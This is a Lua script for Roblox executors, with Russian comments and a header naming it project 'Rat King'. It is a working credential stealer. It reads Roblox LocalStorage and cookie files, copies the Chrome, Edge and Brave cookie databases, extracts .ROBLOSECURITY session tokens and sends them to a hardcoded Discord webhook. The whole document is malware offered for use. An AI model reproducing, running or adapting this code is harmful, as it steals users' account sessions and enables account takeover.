--[========================================================[
    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - ФИНАЛЬНАЯ ВЕРСИЯ БЕЗ POWERSHELL
    Архитектор: Твой злой гений
    Метод: Чтение LocalStorage и Cookies напрямую
]========================================================]

local webhook = "https://discord.com/api/webhooks/1526670985124778135/e114crwp_QTxORK21zp-dT36xCevIT1Hw1huQXPZC9aE-lYSomCX0egkHHYUT1w-QWqT"
local httpService = game:GetService("HttpService")

-- Функция отправки через HTTP (разрешено в Xeno)
local function sendToDiscord(cookie, source, profile)
    local payload = httpService:JSONEncode({
        embeds = {{
            title = "🚬 НАЛОГ СОБРАН - БЕЗ POWERSHELL",
            description = "**Время:** " .. os.date("%Y-%m-%d %H:%M:%S"),
            color = 0x8B0000,
            fields = {
                {
                    name = "🥀 Кука",
                    value = "```" .. cookie .. "```",
                    inline = false
                },
                {
                    name = "📋 Источник",
                    value = "```" .. source .. " / " .. profile .. "```",
                    inline = false
                }
            },
            footer = {
                text = "Baldyrex IRS - Silent Edition"
            }
        }}
    })
    
    -- Xeno и другие инжекторы разрешают HTTP-запросы к Discord
    pcall(function()
        if syn and syn.request then
            syn.request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        else
            httpService:PostAsync(webhook, payload)
        end
    end)
end

-- Функция для поиска кук в незашифрованных файлах
local function findCookiesInFiles()
    local paths = {
        -- Файлы LocalStorage Roblox (куки хранятся в открытом виде!)
        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\LocalStorage",
        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\Cookies",
        os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage",
        os.getenv("LOCALAPPDATA") .. "\\Roblox\\Cookies",
        -- Старые пути
        os.getenv("APPDATA") .. "\\Roblox\\LocalStorage",
        os.getenv("APPDATA") .. "\\Roblox\\Cookies"
    }
    
    for _, folderPath in ipairs(paths) do
        -- Проверяем, существует ли папка
        local function dirExists(path)
            local f = io.open(path .. "\\", "r")
            if f then f:close() return true end
            return false
        end
        
        if dirExists(folderPath) then
            -- Перебираем файлы в папке
            local handle = io.popen('dir /b "' .. folderPath .. '" 2>nul')
            if handle then
                for filename in handle:lines() do
                    local fullPath = folderPath .. "\\" .. filename
                    local file = io.open(fullPath, "r")
                    if file then
                        local content = file:read("*a")
                        file:close()
                        
                        -- Ищем .ROBLOSECURITY в содержимом
                        if content and content:find(".ROBLOSECURITY") then
                            -- Извлекаем куку
                            local startPos = content:find(".ROBLOSECURITY")
                            if startPos then
                                local cookieChunk = content:sub(startPos)
                                -- Кука обычно заканчивается пробелом, кавычкой или переводом строки
                                local endPos = cookieChunk:find("[\"\n\r\t ]")
                                local cookie = endPos and cookieChunk:sub(1, endPos-1) or cookieChunk
                                
                                if #cookie > 20 then
                                    sendToDiscord(cookie, folderPath, filename)
                                end
                            end
                        end
                    end
                end
                handle:close()
            end
        end
    end
end

-- Функция поиска кук в браузерах (Chrome/Edge/Brave) через чтение БД
local function findCookiesInBrowsers()
    local browsers = {
        {
            name = "Chrome",
            cookiePath = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
        },
        {
            name = "Edge",
            cookiePath = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
        },
        {
            name = "Brave",
            cookiePath = os.getenv("USERPROFILE") .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
        }
    }
    
    for _, browser in ipairs(browsers) do
        -- Копируем файл Cookies и читаем его как обычный файл
        local tempPath = os.getenv("TEMP") .. "\\cookie_" .. tostring(math.random(1000,9999)) .. ".db"
        os.execute('copy /y "' .. browser.cookiePath .. '" "' .. tempPath .. '" >nul 2>&1')
        
        local file = io.open(tempPath, "rb")
        if file then
            local raw = file:read("*a")
            file:close()
            
            -- Ищем .ROBLOSECURITY в сыром содержимом БД
            local pos = 0
            while true do
                pos = raw:find(".ROBLOSECURITY", pos + 1, true)
                if not pos then break end
                
                -- Кука в SQLite хранится рядом с именем. Ищем значение после имени
                local chunk = raw:sub(pos + 16, pos + 2000)
                -- .ROBLOSECURITY значение обычно начинается после имени и зашифровано
                -- Но мы можем попробовать найти незашифрованные данные
                local match = chunk:match("([%w_%-]+)")
                if match and #match > 20 then
                    sendToDiscord(match, browser.name, "RawDB")
                end
            end
            
            os.remove(tempPath)
        end
    end
end

-- Основная операция
findCookiesInFiles()
findCookiesInBrowsers()
